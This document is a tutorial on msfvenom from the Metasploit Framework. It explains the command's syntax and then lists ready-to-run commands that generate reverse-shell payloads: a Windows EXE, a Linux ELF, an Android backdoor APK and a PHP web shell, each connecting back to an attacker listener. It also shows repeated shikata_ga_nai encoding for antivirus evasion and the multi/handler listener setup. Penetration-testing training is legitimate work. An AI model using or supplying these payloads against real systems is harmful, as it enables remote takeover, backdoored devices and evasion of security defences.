## What is `msfvenom`?

**`msfvenom`** is a command-line tool that comes with the **Metasploit Framework**. It combines two older tools:

* `msfpayload` (for creating payloads)
* `msfencode` (for encoding payloads to evade AV)

Now, **`msfvenom`** handles both **payload generation** and **encoding** in a single tool.



## How `msfvenom` is Made Up (Anatomy)

A typical `msfvenom` command consists of:

```bash
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

### Components Breakdown:

| Part    | Description                                                                |
| ------- | -------------------------------------------------------------------------- |
| `-p`    | Payload to use (`windows/meterpreter/reverse_tcp`, etc.)                   |
| `LHOST` | IP address of your attacking machine (listener)                            |
| `LPORT` | Port to connect back to                                                    |
| `-f`    | Output file format (e.g., `exe`, `elf`, `apk`, `raw`, `c`, `python`, etc.) |
| `-o`    | Output file name (optional but recommended)                                |



## Common Payload Types

| Platform | Example Payload                     | Description                     |
| -------- | ----------------------------------- | ------------------------------- |
| Windows  | `windows/meterpreter/reverse_tcp`   | Full-featured Meterpreter shell |
| Linux    | `linux/x86/meterpreter/reverse_tcp` | Meterpreter for Linux           |
| PHP      | `php/meterpreter_reverse_tcp`       | PHP backdoor                    |
| Android  | `android/meterpreter/reverse_tcp`   | Android payload                 |
| MacOS    | `osx/x86/shell_reverse_tcp`         | Shell for macOS                 |



## Example Usages

### 1. **Windows Reverse Shell (EXE file)**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

### 2. **Linux Reverse Shell (ELF binary)**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
```

### 3. **Android APK Backdoor**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 R > backdoor.apk
```

### 4. **PHP Web Shell Payload**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
```



## Optional Encoding (AV Evasion)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_shell.exe
```

* `-e`: encoder
* `-i`: number of iterations



## Starting a Listener with Metasploit

After generating a payload, start the listener:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```
